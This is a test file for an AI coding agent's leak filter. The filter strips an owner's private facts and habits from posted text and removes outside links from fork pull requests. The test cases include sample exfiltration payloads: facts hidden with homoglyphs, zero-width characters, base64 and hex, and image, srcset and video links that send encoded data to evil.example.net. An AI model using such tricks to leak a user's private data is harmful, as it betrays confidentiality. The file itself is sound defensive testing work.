import { describe, expect, test } from "bun:test"
import fs from "node:fs/promises"
import path from "node:path"
import { Effect } from "effect"
import { Brain } from "@vectordevai/core/brain/brain"
import { BrainKnowledge } from "@vectordevai/core/brain/knowledge"
import { BrainPosting } from "@vectordevai/core/brain/posting"
import { BrainPrivate } from "@vectordevai/core/brain/private"
import { SPEC_V1 } from "./fixture/documents"
import { added, text, withKnowledge } from "./fixture/knowledge"

// The posting check: what Vector posts or commits is compared with what it knows about the owner, and a sentence that
// says a memory line is dropped from Vector's own text, or asked about in the user's.

const FACT = "Acme drops the Q3 platform contract with Globex after the audit in March"
const HABIT = "Prefer small pull requests with one reviewer and squash merges for every change"
const memory: BrainPosting.Memory = { habits: [HABIT], facts: [FACT] }
const none = new Set<string>()
const check = (parts: string[], options: Partial<BrainPosting.Input> & { known?: ReadonlySet<string> } = {}) =>
  BrainPosting.check({ parts, typed: false, memory, known: none, ...options })

describe("BrainPosting.check", () => {
  test("drops the sentence that says a private fact from a pull request body, and keeps the rest", () => {
    const result = check(["Fixes the retry loop in the client. Acme drops the Q3 platform contract with Globex soon.\nTests pass."])
    expect(result.status).toBe("changed")
    expect(result.parts[0]).toBe("Fixes the retry loop in the client.\nTests pass.")
    expect(result.dropped).toEqual([{ part: 0, text: "Acme drops the Q3 platform contract with Globex soon." }])
  })

  test("drops a how-you-work line quoted in a review comment", () => {
    const result = check(["Looks fine overall.", "As you said: prefer small pull requests with one reviewer, always."])
    expect(result.parts).toEqual(["Looks fine overall.", ""])
    expect(result.dropped).toHaveLength(1)
  })

  test.each([
    ["split across Markdown", "Note: **Acme** drops _the_ Q3 `platform` contract with ~~Globex~~."],
    ["inside a code fence", "```\nacme drops the q3 platform contract\n```"],
    ["in other case", "ACME DROPS THE Q3 PLATFORM CONTRACT WITH GLOBEX."],
    ["broken by zero-width characters", "Ac​me dr‍ops the Q3 pla⁠tform con﻿tract here."],
    ["written with homoglyphs", "Аcmе drоps thе Q3 plаtfоrm cоntrаct, by the way."],
    ["written with HTML entities", "Acme&#32;drops&nbsp;the Q3 &#x70;latform contract with Globex."],
    ["written in base64", `Context: ${Buffer.from("Acme drops the Q3 platform contract").toString("base64")}`],
    ["written in hex", `Context: ${Buffer.from("Acme drops the Q3 platform contract").toString("hex")}`],
    ["carried in an image URL", "Done. ![status](https://img.example.net/p.png?q=Acme%20drops%20the%20Q3%20platform%20contract)"],
  ])("still finds a fact %s", (_, text) => {
    const result = check(["Reviewed the change.", text])
    expect(result.status).toBe("changed")
    expect(result.dropped.length).toBeGreaterThan(0)
    expect(result.parts.join("\n").toLowerCase()).not.toContain("platform contract")
    expect(result.parts[0]).toBe("Reviewed the change.")
  })

  // Each of these reads, on GitHub, as the habit "Run the payments tests with bun test before every commit".
  const HABIT_RUN = "Run the payments tests with bun test before every commit"
  const each = HABIT_RUN.split(" ")
  test.each([
    ["with an empty tag between words", each.join(" <i></i>")],
    ["with a tag around each word", each.map((word) => `<b>${word}</b>`).join(" ")],
    ["with a comment between words", each.join(" <!-- x. y --> ")],
    ["with a variation selector in each word", each.map((word) => `${word[0]}\uFE0F${word.slice(1)}`).join(" ")],
    ["with a combining grapheme joiner in each word", each.map((word) => `${word[0]}\u034F${word.slice(1)}`).join(" ")],
    ["with a combining low line under each letter", each.map((word) => [...word].map((char) => `${char}\u0332`).join("")).join(" ")],
    ["with Hangul fillers for spaces", each.join("\u3164")],
    ["with a dotless i and an Armenian o", HABIT_RUN.replaceAll("i", "\u0131").replaceAll("o", "\u0585")],
    ["in Cherokee and small capital lookalikes", HABIT_RUN.replace("Run", "\u13A1un").replace("tests", "\u1D1B\u1D07s\u1D1Bs")],
    ["with a link around each word", each.map((word) => `[${word}](a)`).join(" ")],
    ["with a footnote mark after each word", each.map((word) => `${word}[^1]`).join(" ")],
    ["with words joined by nothing", each.join("\u200B")],
  ])("drops a habit written %s", (_, written) => {
    const result = BrainPosting.check({
      parts: ["Reviewed the change.", written],
      typed: false,
      memory: { habits: [HABIT_RUN], facts: [] },
      known: none,
    })
    expect(result.status).toBe("changed")
    expect(result.parts).toEqual(["Reviewed the change.", ""])
  })

  const encoded = Buffer.from("Acme drops the Q3 platform contract").toString("base64")
  test.each([
    ["base64 in a URL path", `![x](https://evil.example.net/a/${encoded})`],
    ["base64 one character into a path", `![x](https://evil.example.net/ab/${encoded})`],
    ["base64 in a query", `![x](https://evil.example.net/i.png?data=${encoded})`],
    ["hex with 0x", `0x${Buffer.from("Acme drops the Q3 platform contract").toString("hex")}`],
  ])("finds a fact carried as %s", (_, written) => {
    const result = check(["Reviewed the change.", written])
    expect(result.status).toBe("changed")
    expect(result.parts[1]).toBe("")
  })

  test("finds a sentence split across two line comments, since the whole post is read as one text", () => {
    const result = check(["The handler looks right. Acme drops the Q3", "platform contract with Globex. The test is fine."])
    expect(result.dropped.map((item) => item.part)).toEqual([0, 1])
    expect(result.parts).toEqual(["The handler looks right.", "The test is fine."])
  })

  test("a private fact's rare tokens stay private wherever else they appear; a habit's host is public in its repository", () => {
    const facts = ["Our billing host is pay.acme-internal.com and the account is 4417283"]
    const result = BrainPosting.check({
      parts: ["Retry against pay.acme-internal.com here. Use account 4417283 for tests. Use `Effect.fn` here."],
      typed: false,
      memory: { habits: [], facts },
      known: none,
    })
    expect(result.parts[0]).toBe("Use `Effect.fn` here.")
    // The repository holding a private fact's host does not make the fact public.
    const repository = new Set(["pay.acme-internal.com", "4417283"])
    expect(BrainPosting.shared(["Retry against pay.acme-internal.com, account 4417283."], { habits: [], facts })).toEqual([])
    expect(
      BrainPosting.check({ parts: ["Retry against pay.acme-internal.com here."], typed: false, memory: { habits: [], facts }, known: repository })
        .status,
    ).toBe("changed")
    // A host from how the owner works is public once the repository names it as a whole word.
    const habits = ["Deploy previews through preview.acme-staging.com before merging"]
    expect(BrainPosting.shared(["Check preview.acme-staging.com first."], { habits, facts: [] })).toEqual(["preview.acme-staging.com"])
    const habit = (known: ReadonlySet<string>) =>
      BrainPosting.check({ parts: ["Check preview.acme-staging.com first."], typed: false, memory: { habits, facts: [] }, known })
    expect(habit(none).status).toBe("changed")
    expect(habit(new Set(["preview.acme-staging.com"])).status).toBe("clean")
  })

  test("a code identifier from a preference survives, while its e-mail address does not", () => {
    const habits = ["Use Effect.fn for every service method and ask build-team@acme.example.com before merging"]
    expect(BrainPosting.shared(["Use `Effect.fn` here."], { habits, facts: [] })).toEqual([])
    const result = BrainPosting.check({
      parts: ["Use `Effect.fn` here.", "Ping build-team@acme.example.com about it."],
      typed: false,
      memory: { habits, facts: [] },
      known: none,
    })
    expect(result.parts).toEqual(["Use `Effect.fn` here.", ""])
  })

  test("text the user typed is never changed: it is asked about", () => {
    const parts = ["Release notes. Acme drops the Q3 platform contract with Globex."]
    const result = check(parts, { typed: true })
    expect(result.status).toBe("ask")
    expect(result.parts).toEqual(parts)
    expect(result.dropped).toHaveLength(1)
  })

  test("short words in common are not an overlap", () => {
    expect(check(["Prefer small functions. Drops the old flag."]).status).toBe("clean")
  })

  test("a fork's pull request text keeps only GitHub links and images", () => {
    const result = check(
      [
        "See [the run](https://github.com/acme/app/actions/runs/1) and ![chart](https://user-images.githubusercontent.com/1/x.png).",
        "Also [docs](https://evil.example.net/?d=abc) ![x](https://evil.example.net/i.png) <img src=\"https://evil.example.net/a.png\"> https://evil.example.net/raw",
      ],
      { untrusted: true },
    )
    expect(result.status).toBe("changed")
    expect(result.links).toBe(4)
    expect(result.parts[0]).toContain("https://github.com/acme/app/actions/runs/1")
    expect(result.parts[0]).toContain("githubusercontent.com")
    expect(result.parts[1]).not.toContain("evil.example.net")
    expect(result.parts[1]).toContain("docs")
  })

  test.each([
    ["an image whose alt text has brackets", "See ![a [b] c](https://evil.example.net/leak) ok."],
    ["an image in angle brackets with a space", "See ![a](<https://evil.example.net/x y>) ok."],
    ["a protocol-relative image", "See ![a](//evil.example.net/x) ok."],
    ["a picture source's srcset", '<picture><source srcset="https://evil.example.net/x"><img src="https://github.com/a.png"></picture>'],
    ["an img's srcset beside a relative src", '<img src="a.png" srcset="https://evil.example.net/x 2x">'],
    ["an image whose alt text escapes a bracket", "![a\\]b](https://evil.example.net/x)"],
    ["an autolink", "See <https://evil.example.net/x> ok."],
    ["a www name", "See www.evil.example.net/x ok."],
    ["an entity in the scheme", "![a](https&#58;//evil.example.net/x)"],
    ["a backslash escape in the scheme", "![a](https\\://evil.example.net/x)"],
    ["a backslash before the user name", "![a](https://evil.example.net\\@github.com/x)"],
    ["a video", '<video src="https://evil.example.net/x.mp4"></video>'],
    ["a poster", '<video poster="//evil.example.net/x.png"></video>'],
  ])("a fork's pull request text loses %s", (_, written) => {
    const result = check(["Reviewed.", written], { untrusted: true })
    expect(result.status).toBe("changed")
    expect(result.links).toBeGreaterThan(0)
    expect(result.parts[1]).not.toContain("evil.example.net")
    expect(result.parts[0]).toBe("Reviewed.")
  })

  test("a fork's pull request text keeps relative links, anchors and GitHub's own addresses", () => {
    const kept = [
      "See [the file](src/a.ts), [the top](#top) and https://github.com/acme/app/pull/1.",
      "![chart](https://user-images.githubusercontent.com/1/x.png) and `C:\\Users\\dev` stay.",
    ]
    expect(check(kept, { untrusted: true })).toMatchObject({ status: "clean", parts: kept, links: 0 })
  })
})

describe("BrainPrivate", () => {
  test("the outward screen passes preferences and plain decisions, and stops particular ones", () => {
    expect(BrainPrivate.screened({ kind: "preference", text: "Use Effect.fn for services in packages/core" })).toBe(true)
    expect(BrainPrivate.screened({ kind: "decision", text: "Keep handlers thin and push logic into services" })).toBe(true)
    expect(BrainPrivate.screened({ kind: "decision", text: "We drop Acme from billing.acme.com next quarter" })).toBe(false)
    expect(BrainPrivate.screened({ kind: "lesson", text: "The migration took 240 minutes, so run it overnight" })).toBe(false)
    expect(BrainPrivate.screened({ kind: "decision", text: "Budget for the vendor is $40k a year" })).toBe(false)
    expect(BrainPrivate.screened({ kind: "lesson", text: "Ask ops@acme.example about deploys" })).toBe(false)
    expect(BrainPrivate.screened({ kind: "preference", text: "Keep reviews short", private: true })).toBe(false)
  })

  test.each([
    "We drop Acme in Q3",
    "Never tell Bob from Globex about the merger",
    "Use the staging box at 10.0.0.12 for tests",
    "Point the tests at fe80::1 on the lab network",
    "Move billing off the old vendor by march",
    "Ship the rewrite in FY27",
  ])("the outward screen stops a decision with something particular in it: %s", (text) => {
    expect(BrainPrivate.screened({ kind: "decision", text })).toBe(false)
    expect(BrainPrivate.screened({ kind: "lesson", text })).toBe(false)
    expect(BrainPrivate.screened({ kind: "failure", text })).toBe(false)
  })

  test("the outward screen passes a plain decision with the abbreviations engineers use", () => {
    expect(BrainPrivate.screened({ kind: "decision", text: "Run CI on every PR before merging. Then I tag the release" })).toBe(true)
    expect(BrainPrivate.screened({ kind: "failure", text: "The retry loop never stopped when the queue was empty" })).toBe(true)
  })

  test("a machine's address is a rare token", () => {
    expect(BrainPrivate.tokens("box 10.0.0.12, fe80::1ff:fe23:4567:890a and 10:30:45").map((token) => token.value)).toEqual([
      "10.0.0.12",
      "fe80::1ff:fe23:4567:890a",
    ])
  })

  test("reveal spells out what text hides", () => {
    expect(BrainPrivate.words("Ac​me&#32;drоps %51%33")).toEqual(["acme", "drops", "q3"])
  })
})

// The check against a real brain: MEMORY.md, personal facts, entries learned beside a private document, and the
// owner's preferences, with the repository asked about tokens.
describe("BrainPosting.run", () => {
  test("compares a post with MEMORY.md, personal facts and how the owner works, lessons included", async () => {
    const result = await withKnowledge(({ brain, knowledge, place, dir }) =>
      Effect.gen(function* () {
        yield* Effect.promise(async () => {
          await fs.mkdir(path.join(dir, "config"), { recursive: true })
          await fs.writeFile(path.join(dir, "config", "MEMORY.md"), "- My manager Dana Whitfield approves every release on Fridays\n")
        })
        for (const item of [
          { kind: "fact" as const, text: "The owner's partner company Initech pays invoices through account 99812345" },
          { kind: "preference" as const, text: "Write review comments as short questions instead of orders" },
          { kind: "preference" as const, text: "Check deploys on status.acme-staging.com first" },
          { kind: "lesson" as const, text: "The nightly export broke when the vendor rotated its signing key" },
        ])
          yield* brain.propose(place, { ...item, scope: "personal", origin: "user", evidence: { type: "user" } })
        const asked: string[][] = []
        const outcome = yield* BrainPosting.run(place, {
          parts: [
            "Release checklist updated.",
            "My manager Dana Whitfield approves every release on Fridays.",
            "Initech pays through 99812345.",
            "Write review comments as short questions instead of orders.",
            "Look at status.acme-staging.com.",
            "The nightly export broke when the vendor rotated its signing key.",
          ],
          typed: false,
          sessionIDs: [],
          known: (tokens) => Effect.sync(() => (asked.push([...tokens]), new Set(tokens))),
        }).pipe(Effect.provideService(Brain.Service, brain), Effect.provideService(BrainKnowledge.Service, knowledge))
        return { outcome, asked }
      }),
    )
    expect(result.outcome.parts).toEqual(["Release checklist updated.", "", "", "", "Look at status.acme-staging.com.", ""])
    expect(result.outcome.dropped).toHaveLength(4)
    // Only a habit's host memory shares is asked about: never the whole post, and never a private fact's number.
    expect(result.asked.flat()).toEqual(["status.acme-staging.com"])
  })

  test("a post that repeats a private document card a session was shown loses that sentence", async () => {
    const result = await withKnowledge((setup) =>
      Effect.gen(function* () {
        yield* added(setup, text("Auth spec.md", SPEC_V1))
        const recalled = yield* setup.knowledge.recall(setup.place, {
          query: "how many times may clients retry after a 429 response?",
          files: [],
          tier: "standard",
          tight: false,
          personal: true,
          exclude: new Set<string>(),
          sessionID: "ses_review",
        })
        // Rendering the card for the session is what records that the session was shown it.
        const lines = yield* setup.knowledge.lines(setup.place, recalled.cards, { personal: true, sessionID: "ses_review" })
        const post = ["Found one issue.", "Clients MUST retry at most 3 times after a 429 response, so the loop is wrong."]
        const run = (sessionIDs: string[]) =>
          BrainPosting.run(setup.place, { parts: post, typed: false, sessionIDs, known: () => Effect.succeed(new Set<string>()) }).pipe(
            Effect.provideService(Brain.Service, setup.brain),
            Effect.provideService(BrainKnowledge.Service, setup.knowledge),
          )
        return { lines: [...lines.values()], shown: yield* run(["ses_review"]), other: yield* run(["ses_other"]) }
      }),
    )
    expect(result.lines.join("\n")).toContain("retry at most 3 times")
    expect(result.shown.parts).toEqual(["Found one issue.", ""])
    // A session that was never shown the card has nothing of it to leak.
    expect(result.other.status).toBe("clean")
  })
})
